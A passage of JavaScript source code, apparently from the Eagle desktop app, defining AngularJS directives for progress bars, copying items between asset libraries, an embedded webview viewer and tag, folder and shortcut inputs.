                this.libraryDiffCurr = this.libraryDiffCount;
            }
            this.$scope.$evalAsync();
        });

        // 資源庫 images 資料夾列表載入中
        ipcRenderer.on('app-status-library-dirs-loading', (e) => {
            this.status = LoadProgress.STATUS.DIR_LOADING;
            this.$scope.$evalAsync();
        });


        // 資源庫 images 資料夾列表載入完成
        let loadLibraryWithoutCacheTimeout;
        ipcRenderer.on('app-status-library-dirs-loaded', (e, count) => {
            this.loadLibraryStartTime = Date.now();
            if (count) {
                this.libraryTotal = count;
                this.currentLoaded = 0;
                loadLibraryWithoutCacheTimeout = setInterval(() => {
                    this.#calculateLoadLibraryTimeLeft();
                    this.$scope.$evalAsync();
                }, 1000);
            }
            this.status = LoadProgress.STATUS.DIR_LOADED;
            this.$scope.$evalAsync();
        });

        // 單個 metadata.json 載入完成
        ipcRenderer.on('app-status-library-metadata-loading', (e) => {
            if (this.libraryTotal > 0 && this.currentLoaded < this.libraryTotal) {
                this.status = LoadProgress.STATUS.METADATA_LOADING;
                this.currentLoaded += 10;
                if (this.currentLoaded > this.libraryTotal) {
                    this.currentLoaded = this.libraryTotal;
                }
                this.progress = 20 + (this.currentLoaded * 100 * 7 / this.libraryTotal) / 10;
                this.$scope.$evalAsync();
            }
        });

        // 所有 metadata.json 載入完成
        ipcRenderer.on('app-status-library-metadata-loaded', (e) => {
            this.progress = 95;
            this.status = LoadProgress.STATUS.METADATA_LOADED;
            this.$scope.$evalAsync();
        });

        // 資源庫完全載入完成
        ipcRenderer.on('app-status-library-loaded', async (e, params) => {
            this.loadLibraryStartTime = 0;
            this.loadLibraryTimeLeftInSeconds = 0;
            clearInterval(loadLibraryWithoutCacheTimeout);
            this.status = LoadProgress.STATUS.LIBRARY_LOADED;
            this.$scope.$evalAsync();
            this.close();
        });

        ipcRenderer.on('app-status-library-cache-loading', (e) => {
            this.status = LoadProgress.STATUS.CACHE_LOADING;
            this.$scope.$evalAsync();
        });

        // 緩存載入完成
        ipcRenderer.on('app-status-library-cache-loaded', (e) => {
            this.progress = 80;
            this.status = LoadProgress.STATUS.CACHE_LOADED;
            this.$scope.$evalAsync();
        });
    }

    #calculateLoadLibraryTimeLeft() {
        var et = Date.now() - this.loadLibraryStartTime;
        var cpt = this.currentLoaded / et;
        var ett = this.libraryTotal / cpt;
        this.loadLibraryTimeLeftInSeconds = parseInt((ett - et) / 1000);
    }
}

EagleApp.directive('libraryLoadProgress', () => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/library-load-progress.html',
        scope: {},
        link: ($scope) => {
            const loadProgress = new LoadProgress($scope);
            $scope.loadProgress = loadProgress;

            // $scope.$watch('loadProgress.status', (newValue, oldValue) => {
            //     console.log(`status: ${oldValue} -> ${newValue}`);
            // });
        }
    };
});
EagleApp.directive('libraryMergeProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/library-merge-progress.html',
        scope: {},
        link: ($scope, element, attrs, controllersArr) => {
            var ipcRenderer = require('electron').ipcRenderer;

            $scope.isImporting = false;
            $scope.curr = 0;
            $scope.total = 0;
            var timeLeftInterval;

            $scope.cancel = () => {
                $scope.isImporting = false;
                $scope.curr = 0;
                $scope.total = 0;
                $scope.updateStartTime = 0;
                clearInterval(timeLeftInterval);
                ipcRenderer.send('cancel.all');
            };

            ipcRenderer.on("show-import-library-task", (e, total) => {
                $scope.curr = 0;
                $scope.total = total;
                $scope.isImporting = true;
                $scope.updateStartTime = Date.now();
                timeLeftInterval = setInterval(() => {
                    calcuteTimeLeft();
                    $scope.$evalAsync();
                }, 1000);
                $scope.$evalAsync();
            });

            ipcRenderer.on("finish-import-library-task", () => {
                $scope.curr++;
                if ($scope.curr >= $scope.total) {
                    $scope.isImporting = false;
                    $scope.curr = 0;
                    $scope.total = 0;
                    $scope.timeLeftInSeconds = 0;
                    clearInterval(timeLeftInterval);
                }
                else {
                    calcuteTimeLeft();
                }
                $scope.$evalAsync();
            });

            ipcRenderer.on("close-import-library", () => {

                console.log("导入完成")

                // 如果已经关闭了，就不需要开启了
                // if (!$scope.isImporting) return;

                $scope.isImporting = false;
                $scope.curr = 0;
                $scope.total = 0;
                $scope.timeLeftInSeconds = 0;
                clearInterval(timeLeftInterval);

                swal({
                    html: `
                <div class="alert">
                    <div class="alert-icon success"></div>
                    <h4 class="alert-title">${i18n.__("dialog.mergeLibraryDone.title")}</h4>
                    <p class="alert-desc">${i18n.__("dialog.mergeLibraryDone.descript")}</p>
                </div>
            `,
                    showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__("dialog.mergeLibraryDone.button")
                }).then(() => {
                    ipcRenderer.send("reload-app");
                });

                $scope.$evalAsync();
            });

            function calcuteTimeLeft() {
                var elapsedTime = (new Date().getTime()) - $scope.updateStartTime;
                var chunksPerTime = $scope.curr / elapsedTime;
                var estimatedTotalTime = $scope.total / chunksPerTime;
                $scope.timeLeftInSeconds = parseInt((estimatedTotalTime - elapsedTime) / 1000);
            };
        }
    };
});
EagleApp.directive('eaglepackImportProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/eaglepack-import-progress.html',
        scope: {},
        link: ($scope, element, attrs, controllersArr) => {
            var ipcRenderer = require('electron').ipcRenderer;

            $scope.isExtracting = false;
            $scope.curr = 0;
            $scope.total = 0;
            var timeLeftInterval;

            $scope.cancel = function () {
                $scope.isExtracting = false;
                $scope.curr = 0;
                $scope.total = 0;
                $scope.updateStartTime = 0;
                clearInterval(timeLeftInterval);
                ipcRenderer.send('cancel.all');
            };

            ipcRenderer.on("show-extract-task", function () {
                $scope.curr = 0;
                $scope.total = 0;
                $scope.isExtracting = true;
                $scope.updateStartTime = Date.now();
                timeLeftInterval = setInterval(function () {
                    calcuteTimeLeft();
                    $scope.$evalAsync();
                }, 1000);
                $scope.$evalAsync();
            });

            ipcRenderer.on("add-extract-task", function () {
                $scope.isExtracting = true;
                $scope.total++;
                $scope.$evalAsync();
            });

            ipcRenderer.on("cancel-extract-task", function () {
                $scope.cancel();
                $scope.$evalAsync();
            });

            ipcRenderer.on("finish-extract-task", function () {
                $scope.curr++;

                if ($scope.curr >= $scope.total) {
                    $scope.isExtracting = false;
                    $scope.curr = 0;
                    $scope.total = 0;
                    $scope.timeLeftInSeconds = 0;
                    clearInterval(timeLeftInterval);
                }
                else {
                    calcuteTimeLeft();
                }

                $scope.$evalAsync();
            });

            function calcuteTimeLeft() {
                // 計算剩餘時間
                var elapsedTime = (new Date().getTime()) - $scope.updateStartTime;
                var chunksPerTime = $scope.curr / elapsedTime;
                var estimatedTotalTime = $scope.total / chunksPerTime;
                $scope.timeLeftInSeconds = parseInt((estimatedTotalTime - elapsedTime) / 1000);
            };

        }
    };
});
EagleApp.directive('eaglepackExportProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/eaglepack-export-progress.html',
        scope: {},
        link: ($scope, element, attrs, controllersArr) => {

            var ipcRenderer = require('electron').ipcRenderer;

            $scope.isArchiving = false;
            $scope.curr = 0;
            $scope.total = 0;
            $scope.percent = 0;
            $scope.progress = 0;
            var timeLeftInterval;

            $scope.cancel = function () {
                $scope.isArchiving = false;
                $scope.curr = 0;
                $scope.total = 0;
                $scope.percent = 0;
                $scope.updateStartTime = 0;
                clearInterval(timeLeftInterval);
                ipcRenderer.send('cancel.all');
            };

            function calculateProgress() {
                if ($scope.curr === 0) return;
                var a = parseInt($scope.curr / $scope.total * 50);
                var b = parseInt($scope.percent) || 0;
                $scope.progress = a + b;
                if ($scope.progress >= 100) {
                    $scope.progress = 100;
                }
                if ($scope.percent >= 100) {
                    $scope.isArchiving = false;
                    $scope.curr = 0;
                    $scope.total = 0;
                }
            };

            ipcRenderer.on("show-archive-task", function () {
                $scope.curr = 0;
                $scope.total = 0;
                $scope.percent = 0;
                $scope.isArchiving = true;
                $scope.updateStartTime = Date.now();
                timeLeftInterval = setInterval(function () {
                    calcuteTimeLeft();
                    $scope.$evalAsync();
                }, 1000);
                $scope.$evalAsync();
            });

            ipcRenderer.on("add-archive-task", function () {
                $scope.isArchiving = true;
                $scope.total++;
                calculateProgress();
                $scope.$evalAsync();
            });

            ipcRenderer.on("update-archive-percent", function (e, percent) {
                if (percent > $scope.percent) {
                    $scope.percent = percent || 0;
                    calcuteTimeLeft();
                    calculateProgress();
                    $scope.$evalAsync();
                }
            });

            ipcRenderer.on("finish-archive-task", function () {
                $scope.curr++;
                calculateProgress();
                clearInterval(timeLeftInterval);
                $scope.$evalAsync();
            });

            ipcRenderer.on("abort-archive-task", function () {
                $scope.isArchiving = false;
                $scope.curr = 0;
                $scope.total = 0;
                $scope.percent = 0;
                clearInterval(timeLeftInterval);
                $scope.$evalAsync();
            });

            function calcuteTimeLeft() {
                // 计算剩馀时间
                var elapsedTime = (new Date().getTime()) - $scope.updateStartTime;
                var chunksPerTime = $scope.percent / elapsedTime;
                var estimatedTotalTime = 100 / chunksPerTime;
                $scope.timeLeftInSeconds = parseInt((estimatedTotalTime - elapsedTime) / 1000);
            };

        }
    };
});
EagleApp.directive('fileThumbnailProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/file-thumbnail-progress.html',
        // scope: {},
        link: ($scope, element, attrs, controllersArr) => {
        }
    }
});
EagleApp.directive('fileExportProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/file-export-progress.html',
        scope: {},
        link: ($scope, element, attrs, controllersArr) => {
            var ipcRenderer = require('electron').ipcRenderer;

            $scope.isExporting = false;
            $scope.curr = 0;
            $scope.total = 0;
            var timeLeftInterval;

            $scope.cancel = function () {
                close();
                ipcRenderer.send('cancel.all');
            };

            ipcRenderer.on("show-export-task", (event, total) => {
                if (total > 0) {
                    // $scope.curr = 0;
                    $scope.total += total;
                    $scope.isExporting = true;
                    $scope.updateStartTime = Date.now();
                    timeLeftInterval = setInterval(() => {
                        calcuteTimeLeft();
                        $scope.$evalAsync();
                    }, 1000);
                    $scope.$evalAsync();
                }
            });

            ipcRenderer.on("finish-export-task", (event, finishDir) => {
                $scope.curr++;
                if ($scope.curr >= $scope.total) {
                    if ($scope.isExporting && finishDir) {
                        ipcRenderer.send('show-item-in-folder', finishDir);
                    }
                    close();
                }
                else {
                    calcuteTimeLeft();
                }
                $scope.$evalAsync();
            });

            ipcRenderer.on("close-export-task", (event, total) => {
                // $scope.curr = 0;
                // $scope.total = 0;
                // $scope.isExporting = false;
                $scope.$evalAsync();
                clearInterval(timeLeftInterval);
            });

            function calcuteTimeLeft() {
                // 計算剩餘時間
                var elapsedTime = (new Date().getTime()) - $scope.updateStartTime;
                var chunksPerTime = $scope.curr / elapsedTime;
                var estimatedTotalTime = $scope.total / chunksPerTime;
                $scope.timeLeftInSeconds = parseInt((estimatedTotalTime - elapsedTime) / 1000);
            };

            function close() {
                $scope.curr = 0;
                $scope.total = 0;
                $scope.isExporting = false;
                $scope.timeLeftInSeconds = 0;
                clearInterval(timeLeftInterval);
            }
        }
    }
});
EagleApp.directive('fileAddLibraryProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/file-add-library-progress.html',
        scope: {},
        link: ($scope, element, attrs, controllersArr) => {
            var ipcRenderer = require('electron').ipcRenderer;

            $scope.isAdding = false;
            $scope.curr = 0;
            $scope.total = 0;
            $scope.libraryName = "";
            $scope.forceQuit = false;

            $scope.$on("ADD_TO_LIBRARY", function (e, params) {
                if (!params.library || !params.items) return;
                if (params.smartFolder || params.tagGroup) {
                    addToLibrary(params);
                    return;
                }

                if (params.items.length === 1) {
                    addToLibrary(params);
                    $scope.$evalAsync();
                }
                else {
                    var html = $filter('i18n')("Dialog.BulkAction.Descript", [
                        { "property": "count", "value": params.items.length },
                    ]);
                    swal({
                        html: `
                    <div class="alert">
                        <div class="alert-icon warning"></div>
                        <h4 class="alert-title">${i18n.__("Dialog.BulkAction.Title")}</h4>
                        <p class="alert-desc">${html}</p>
                    </div>
                `,
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
                        width: 400,
                        customClass: "alert-box",
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__("Dialog.BulkAction.Button"),
                        cancelButtonText: i18n.__("general.cancel"),
                        // allowEnterKey: false,
                    }).then(function (result) {
                        addToLibrary(params);
                        $scope.$evalAsync();
                    }, function () {
                    });
                }
            });

            $scope.cancel = function () {
                $scope.isAdding = false;
                $scope.forceQuit = true;
                ipcRenderer.send('electron-info', `[app] User interrupt the add library task.`);
            };

            function addToLibrary(params) {

                $scope.isAdding = true;
                $scope.total = params.items.length;
                $scope.libraryName = params.library.name;
                $scope.msg = $filter('i18n')("progress.copyingToLibrary.msg", [
                    { "property": "path", "value": $scope.libraryName },
                ]);

                let library = params.library;
                let libraryPath = library.path;
                let items = params.items;
                let folder = angular.copy(params.folder);
                let smartFolder = angular.copy(params.smartFolder);
                let tagGroup = angular.copy(params.tagGroup);
                let success = [];
                let fail = [];

                // 資源庫不存在
                if (!fs.existsSync(libraryPath)) {
                    ipcRenderer.send('show-error-box', {
                        title: i18n.__('dialog.libraryMissed.title'),
                        message: i18n.__('dialog.libraryMissed.desc')
                    });
                    return;
                }

                if (tagGroup) {
                    ipcRenderer.send('electron-info', `[app] Add tagGroup(${tagGroup.name}) to other library: ${libraryPath}`);

                    let targetMetadataPath = path.normalize(`${libraryPath}/metadata.json`);

                    fs.readFile(targetMetadataPath, "utf8", function (err, metadataJSON) {
                        if (err) {
                            ipcRenderer.send('electron-log', "" + err.stack || err);
                        }
                        else {
                            let library = JSON.parse(metadataJSON);
                            let targetTagsGroups = library.tagsGroups;

                            tagGroup.id = guid();
                            targetTagsGroups.unshift(tagGroup);

                            library.modificationTime = Date.now();
                            let newMetadataJSON = JSON.stringify(library);
                            updateLibraryMetadata(targetMetadataPath, newMetadataJSON);
                            $rootScope.notify({
                                message: i18n.__("general.taskFinished"),
                                duration: 800,
                            });
                        }
                    });
                    $scope.isAdding = false;
                    return;
                }

                if (smartFolder) {
                    ipcRenderer.send('electron-info', `[app] Add smartFolder(${smartFolder.name}) to other library: ${libraryPath}`);

                    let targetMetadataPath = path.normalize(`${libraryPath}/metadata.json`);

                    fs.readFile(targetMetadataPath, "utf8", function (err, metadataJSON) {
                        if (err) {
                            ipcRenderer.send('electron-log', "" + err.stack || err);
                        }
                        else {
                            let library = JSON.parse(metadataJSON);
                            let targetSmartFolders = library.smartFolders;

                            // 更换所有智能文件夹 ID
                            smartFolder.id = guid();
                            eagle.utils.tree.walk(smartFolder.children, 'children', function (child, parent) {
                                child.id = guid();
                            });

                            targetSmartFolders.unshift(smartFolder);
                            library.modificationTime = Date.now();
                            let newMetadataJSON = JSON.stringify(library);
                            updateLibraryMetadata(targetMetadataPath, newMetadataJSON);
                            $rootScope.notify({
                                message: i18n.__("general.taskFinished"),
                                duration: 800,
                            });
                        }
                    });
                    $scope.isAdding = false;
                    return;
                }

                if (folder) {
                    let clones = [];
                    cloneTree(clones, [folder]);
                    folder = clones[0];
                    ipcRenderer.send('electron-info', `[app] Add folder(${folder.name}) contains ${items.length} files to other library: ${libraryPath}`);

                    let targetMetadataPath = path.normalize(`${libraryPath}/metadata.json`);

                    fs.readFile(targetMetadataPath, "utf8", function (err, metadataJSON) {
                        if (err) {
                            ipcRenderer.send('electron-log', "" + err.stack || err);
                        }
                        else {
                            let library = JSON.parse(metadataJSON);
                            let targetFolders = library.folders;
                            let existsFolders = {};

                            targetFolders.forEach(function (targetFolder) {
                                existsFolders[targetFolder.id] = true;
                            });
                            eagle.utils.tree.walk(targetFolders, 'children', function (child, parent) {
                                existsFolders[child.id] = true;
                            });

                            // 避免重复文件夹
                            let removeFolders = [];
                            eagle.utils.tree.walk(folder.children, 'children', function (child, parent) {
                                if (parent && existsFolders[child.id]) {
                                    let idx = parent.children.indexOf(child);
                                    if (idx > -1) {
                                        removeFolders.push({
                                            folder: child,
                                            parent: parent
                                        });
                                    }
                                }
                            });
                            removeFolders.forEach(function (f) {
                                let parent = f.parent;
                                let folder = f.folder;
                                let idx = parent.children.indexOf(folder);
                                if (idx > -1) {
                                    parent.children.splice(idx, 1);
                                }
                            })

                            if (!existsFolders[folder.id]) {
                                targetFolders.unshift(folder);
                                library.modificationTime = Date.now();
                                let newMetadataJSON = JSON.stringify(library);
                                updateLibraryMetadata(targetMetadataPath, newMetadataJSON);
                            }
                        }
                    });
                }
                else {
                    ipcRenderer.send('electron-info', `[app] Add ${items.length} files to other library: ${libraryPath}`);
                }

                var cbs = items.map(function (item, index) {
                    return function (callback) {
                        if ($scope.forceQuit) {
                            fail.push(item);
                            callback();
                            return;
                        }
                        copyToLibrary(item, libraryPath, folder, index, function (err) {
                            if (err) {
                                fail.push(item);
                                ipcRenderer.send('electron-log', `[app] Add ${item.name} fail`);
                                ipcRenderer.send('electron-log', "" + err.stack || err);
                            }
                            else {
                                success.push(item);
                            }
                            $scope.curr++;
                            $scope.$evalAsync();
                            callback();
                        });
                    }
                });

                const async = require('async');
                async.parallelLimit(cbs, 5, function (err, result) {
                    $scope.isAdding = false;
                    $scope.curr = 0;
                    $scope.total = 0;
                    $scope.forceQuit = false;
                    ipcRenderer.send('electron-info', `[app] Add to library finished, total: ${items.length}, success: ${success.length}, fail: ${fail.length}`);
                    $rootScope.notify({
                        message: i18n.__("general.taskFinished"),
                        duration: 800,
                    });

                    let targetMtimePath = path.normalize(`${libraryPath}/mtime.json`);
                    fs.readFile(targetMtimePath, "utf8", function (err, data) {
                        if (!err) {
                            var mtimeMappings = JSON.parse(data);
                            items.forEach(function (item) {
                                mtimeMappings[item.id] = item.lastModified;
                            });
                            let updateedMtimeJSON = JSON.stringify(mtimeMappings);
                            fs.writeFile(targetMtimePath, updateedMtimeJSON, function (err) { });
                        }
                    });
                });
            }

            function updateLibraryMetadata(targetMetadataPath, newMetadataJSON) {
                let tempDir = targetMetadataPath.replace("metadata.json", "~$metadata.json.tmp")

                fs.writeFileSync(tempDir, newMetadataJSON);
                var outstream = fs.createWriteStream(targetMetadataPath, {
                    'flags': 'w'
                });
                outstream.write(newMetadataJSON);
                outstream.on('finish', function () {
                    ipcRenderer.send('electron-info', `[bg] metadata.json updated successfully: ${targetMetadataPath}`);
                    console.log("除存成功");
                    fse.remove(tempDir);
                });
                outstream.on('error', function (err) {
                    ipcRenderer.send('electron-log', "" + err.stack || err);
                    try {
                        fs.renameSync(tempDir, targetMetadataPath);
                    }
                    catch (err) {
                        ipcRenderer.send('electron-log', "" + err.stack || err);
                    }
                });
                outstream.end();
            }

            function copyToLibrary(item, libraryPath, folder, index, callback) {
                try {

                    let itemDir = `${path.dirname(FileUrlHelper.getRawPath(item))}/`;
                    let outDir = path.normalize(`${libraryPath}/images/${item.id}.info/`);
                    let newMetadataFile = path.normalize(`${outDir}/metadata.json`);
                    fs.exists(outDir, function (isExists) {
                        if (isExists) {
                            return callback();
                        }
                        else {
                            fse.copy(itemDir, outDir, function (err) {
                                if (err) {
                                    ipcRenderer.send('electron-log', "" + err.stack || err);
                                    return callback(err);
                                }
                                fs.readFile(newMetadataFile, "utf8", function (err, result) {
                                    try {
                                        let newItem = JSON.parse(result);
                                        // 框选搬移文件，需移除原来的 folders 属性
                                        if (!folder) {
                                            newItem.folders = [];
                                        }
                                        // 自动排序的文件夹，不更新修改时间
                                        if (folder?.orderBy === "MANUAL") {
                                        }
                                        else {
                                            newItem.modificationTime = Date.now() + index;
                                        }
                                        let json = JSON.stringify(newItem);
                                        fs.writeFile(newMetadataFile, json, function (err) {
                                            callback(err);
                                        });
                                    }
                                    catch (err) {
                                        ipcRenderer.send('electron-log', "" + err.stack || err);
                                        return callback(err);
                                    }
                                });
                            });
                        }
                    })
                }
                catch (err) {
                    callback(err);
                }
            }
        }
    }
});
EagleApp.directive('debugReportProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/debug-report-progress.html', 
        link: ($scope, element, attrs, controllersArr) => {

        }
    };
});
EagleApp.directive('webpConvertProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/webp-convert-progress.html',
        scope: {},
        link: ($scope, element, attrs, controllersArr) => {

            $scope.webpConvertQueue = [];
            $scope.webpConvertFinishQueue = [];

            $scope.cancelWebpConvert = () => {
                IPCHelper.send('cancel.webp.convert');
                $scope.webpConvertQueue = [];
                $scope.webpConvertFinishQueue = [];
            };

            $scope.$on('WEBP_CONVERT_START', (e, { images, format }) => {
                if (!images || images.length === 0 || !format) return;
                var webpConvertTasks = [];
                images.forEach((image) => {
                    if (image && image.ext === "webp") {
                        webpConvertTasks.push({
                            image: image,
                            format: format
                        });
                    }
                });
                var message = $filter('i18n')("dialog.webpConvert.desc", [
                    { "property": "count", "value": webpConvertTasks.length },
                    { "property": "format", "value": format.toUpperCase() }
                ]);
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon warning"></div>
                            <h4 class="alert-title">${i18n.__("dialog.webpConvert.title")}</h4>
                            <p class="alert-desc">${message}</p>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__("dialog.webpConvert.button"),
                    cancelButtonText: i18n.__("general.cancel"),
                }).then(() => {
                    webpConvertTasks.forEach((task) => {
                        $scope.webpConvertQueue.push(task.image);
                    });
                    if (webpConvertTasks.length > 0) {
                        ayncsWebpConvert(webpConvertTasks);
                    }
                    $scope.$evalAsync();
                });
            });

            ipcRenderer.on('webp.converted', (e, converted) => {

                $scope.webpConvertFinishQueue.push(converted);

                if ($scope.webpConvertFinishQueue.length === $scope.webpConvertQueue.length) {
                    $scope.webpConvertFinishQueue = [];
                    $scope.webpConvertQueue = [];
                }

                $scope.$evalAsync();
            });

            function ayncsWebpConvert (tasks) {
                if (!tasks || tasks.length === 0) return; 
                setTimeout(() => {
                    let total = tasks.length;
                    let once = 20;
                    let loopCount = total / once;
                    let countOfSend = 0;
            
                    function send () {
                        var start = countOfSend * once;
                        var willSendImages = tasks.slice(start, start + once);
                        countOfSend += 1;
                        console.log("第 %d 批傳送，目前進度 %d / %d", countOfSend, willSendImages.length + (countOfSend - 1) * once, total);
                        if (backgroundWindowID === undefined) {
                            ipcRenderer.send('webp-convert', willSendImages);
                        }
                        else {
                            ipcRenderer.sendTo(backgroundWindowID, 'webp-convert', willSendImages);
                        }
                        loop();
                    }
            
                    function loop() {
                        if (countOfSend < loopCount) {
                            window.requestAnimationFrame(send);
                        }
                    }
                    loop();
                }, 0);
            }
        }
    }
});
EagleApp.directive('fixutilProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/fixutil-progress.html',
        // scope: {},
        link: ($scope, element, attrs, controllersArr) => {
        }
    }
});
EagleApp.directive('fixutilCleanEmptyFolderProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/fixutil-clean-empty-folder-progress.html',
        // scope: {},
        link: ($scope, element, attrs, controllersArr) => {
        }
    }
});

EagleApp.directive('webView', function() {
    return {
        restrict: 'E',
        link: function(scope, element, attrs) {

            function init () {
                let src = attrs.src;
                let current = scope.current;
                let isVideo = current.medium !== undefined;
                let html;
                let tagName = "webview";
                let className = "";
                let userAgent = EagleConfig.USER_AGENT;
                
                if (isVideo) {
                    className = "is-video";
                }

                html = `<${tagName} id="url-viewer" class="${className}" allowpopups useragent="${userAgent}"></${tagName}>`;    

                let $elem = $(element).html(html);
                if (tagName === "iframe") return;

                const webview = $elem.find("webview")[0];
                
                currentWindow.on('leave-full-screen', function () {
                    webview.executeJavaScript(`document.exitFullscreen();`);
                });

                webview.addEventListener('enter-html-full-screen', (e) => {
                    if (process.platform === 'darwin') {
                        webview.executeJavaScript(`document.exitFullscreen();`);
                    }
                    $bodyScope.toggleSlideshow();
                    $bodyScope.$evalAsync();
                })
                webview.addEventListener('did-fail-load', (e) => {
                    console.log(e);
                })
                webview.addEventListener('console-message', (e) => {
                    console.log(e.message)
                })
                webview.addEventListener('crash', (e) => {
                    console.log(e);  
                })
                webview.addEventListener('will-navigate', (e) => {
                    console.log(e.url);
                    if (e.url && e.url !== webview.src) {
                    }
                    else {
                        e.preventDefault();
                        e.stopPropagation();
                        webview.stop();
                        // webview.getWebContents().stop();
                        webview.reload();
                    }
                });

                webview.addEventListener('page-favicon-updated', (e) => {
                    console.log(e.favicons);
                    webview.favicon = e.favicons[0];
                });

                webview.src = src;
            }

            init();

            attrs.$observe('src', function (val) {
                init();
            });
        }
    };
});
EagleApp.directive('webviewToolbar', ($timeout) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/webview-toolbar.html',
        scope: {
            item: '=',
            theme: '=',
        },
        link: ($scope, element, attrs) => {

            attrs.$observe('webviewId', function (val) {
                $scope.webviewControl = {};
                $scope.$evalAsync();
                $timeout(() => {
                    init();
                }, 200);
            });

            function init () {

                const webviewId = attrs.webviewId;
                const webview = document.querySelector(`#${webviewId} webview`);

                $scope.webviewControl = {
                    getTitle: () => {
                        return webview.getTitle();
                    },
                    getURL: () => {
                        return webview.getURL();
                    },
                    favicon: webview.favicon,
                    canGoBack: () => {
                        return webview.canGoBack();
                    },
                    canGoForward: () => {
                        return webview.canGoForward();
                    },
                    isLoading: () => {
                        return webview.isLoading();
                    },
                    stop: () => {
                        webview.stop();
                    },
                    reload: () => {
                        webview.reload();
                    },
                    goBack: () => {
                        webview.goBack();
                    },
                    goForward: () => {
                        webview.goForward();
                    },
                    openExternal: () => {
                        shell.openExternal(webview.src);
                    },
                    copyURL: () => {
                        electron.clipboard.writeText(webview.src);
                    },
                };

                console.log($scope.webviewControl)

                // events
                webview.addEventListener('page-title-updated', (e) => {
                    $scope.webviewControl.title = e.title;
                    $scope.webviewControl.url = webview.getURL()
                    console.log($scope.webviewControl)
                    $scope.$evalAsync();
                });

                webview.addEventListener('page-favicon-updated', (e) => {
                    console.log(e.favicons);
                    $scope.webviewControl.favicon = e.favicons[0];
                    console.log($scope.webviewControl)
                    $scope.$evalAsync();
                });
            }
        }
    }
});
EagleApp.directive('foldersInput', function ($timeout, $rootScope) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/folders-input.html',
        replace: true,
        scope: {
            theme: '=theme',
            folderIds: '=',
            onChange: '&'
        },
        link: function ($scope, element) {
            $scope.folderMappings = $bodyScope.folderMappings;
            $scope.remove = (index) => {
                $scope.folderIds.splice(index, 1);
                $scope.onChange();
            };

            element.on("click", function (e) {
                e.stopPropagation();

                const folders = $bodyScope.folders;
                const originalSelectedIds = $scope.folderIds.reduce((map, id) => {
                    map[id] = true;
                    return map;
                }, {});

                FolderSelectPanel.open({
                    folders: folders,
                    selectedIds: originalSelectedIds,
                    onChanged: (result) => {
                        if (!result?.isDirty) return;
                        const { selectedFolderIds, deselectedFolderIds } = result;
                        $scope.folderIds = Object.keys(selectedFolderIds);
                        $scope.$evalAsync(() => {
                            $timeout(() => {
                                $scope.onChange();
                            });
                        });
                    }
                });
            });
        }
    }
});
EagleApp.directive('tagsInput', function ($timeout, $rootScope) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/tags-input.html',
        replace: true,
        scope: {
            theme: '=theme',
            tags: '=',
            onChange: '&'
        },
        link: function ($scope, element) {

            $scope.TagManager = $bodyScope.TagManager;

            $scope.remove = (tag) => {
                const index = $scope.tags.indexOf(tag);
                if (index >= 0) {
                    $scope.tags.splice(index, 1);
                    $scope.onChange();
                }
            };

            element.on("click", function (e) {
                e.stopPropagation();
                const originSelected = $scope.tags.reduce((map, tag) => {
                    map[tag] = true;
                    return map;
                }, {});

                TagSelectPanel.open({
                    tagManager: $scope.TagManager,
                    selectedTags: originSelected,
                    // showCreateTagBtn: false,
                    onChanged: (result) => {
                        const { selectedTags } = result;
                        $scope.tags = Object.keys(selectedTags);
                        $scope.$evalAsync(() => {
                            $timeout(() => {
                                $scope.onChange && $scope.onChange();
                            });
                        });
                    }
                });
            });
        }
    }
});
angular.module("shortcutInput", [])
.directive('shortcutInput', function($timeout) {
    return {
        restrict: 'A',
        require: '?ngModel',
        link: function(scope, element, attrs, ngModel) {
            element.on("keydown", function (e) {
                e.preventDefault();
                var keyCode = e.which;
                var char;
                if (e.originalEvent.code) {
                    char = e.originalEvent.code.replace("Key", "").replace("Digit", "");
                    switch (char) {
                        case "BracketLeft":
                            char = "[";
                            break;
                        case "BracketRight":
                            char = "]";
                            break;
                        case "Minus":
                            char = "-";
                            break;
                        case "Equal":
                            char = "=";
                            break;
                        case "Backslash":
                            char = "\\";
                            break;
                        case "Semicolon":
                            char = ";";
                            break;
                        case "Quote":
                            char = "'";
                            break;
                        case "Backquote":
                            char = "`";
                            break;
                        case "Slash":
                            char = "/";
                            break;
                        case "Period":
                            char = ".";
                            break;
                        case "Comma":
                            char = ",";
                            break;
                        
                    }
                }
                console.log(char);
                // console.log(e.originalEvent.code)
                // console.log(String.fromCharCode(e.which).toUpperCase());
                // if (e.which === 229) {
                //     debugger
                // }
                // var char = String.fromCharCode(keyCode);
                var shiftKey = e.shiftKey;
                var metaKey = e.metaKey;
                var ctrlKey = e.ctrlKey;
                var altKey = e.altKey;
                var needCombindKey = false;
                var result = "";
                if (ctrlKey) {
                    if (process.platform != 'darwin') {
                        result += "Ctrl + ";
                    }
                    else {
                        result += "Control + ";
                    }
